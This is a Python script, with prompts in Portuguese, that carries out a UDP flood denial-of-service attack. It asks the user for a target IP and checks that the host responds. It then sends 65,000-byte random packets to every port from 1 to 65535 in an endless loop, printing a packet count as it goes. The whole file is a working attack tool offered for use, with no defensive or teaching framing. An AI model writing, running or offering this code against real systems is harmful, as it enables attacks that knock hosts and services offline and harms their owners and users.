import socket
import random
import os
import time
import errno

def ip_valido(ip):
    octetos = ip.split(".")

    if len(octetos) != 4:
        return False

    for i, octeto in enumerate(octetos):
        if not octeto.isdigit():
            return False

        numero = int(octeto)

        if i == 0 or i == 3:
            if numero < 1 or numero > 255:
                return False
        else:
            if numero < 0 or numero > 255:
                return False
    return True

def ip_responde(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        estado_ligacao = sock.connect_ex((ip, 1))
    finally:
        sock.close()

    if estado_ligacao == 0:
        return True
    if estado_ligacao == errno.ECONNREFUSED:
        return True

    return False

def flood(ip):
    if not ip_responde(ip):
        print(f"{ip} - IP não encontrado")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pacote = random._urandom(65000)
    contador = 0

    while True:
        for i in range(1,65536):
            porta = i
            sock.sendto(pacote,(ip, porta))
            print(f"Foram enviados {contador} pacotes para o IP {ip} na porta {porta}")
            contador = contador + 1
            time.sleep(0.0001) #1/10000 segundos

def menu():
    while True:
        ip = input("Introduza o IP que pretende fazer o ataque: ").strip()
        if ip_valido(ip):
            break
        print("Introduza um IP válido.")

    return ip

def main():
    os.system('clear')
    os.system('figlet UDP Flood')

    print("\nO script pede apenas o IP da máquina alvo do UDP Flood.\n")

    ip = menu()
    flood(ip)


if __name__ == "__main__":
    main()
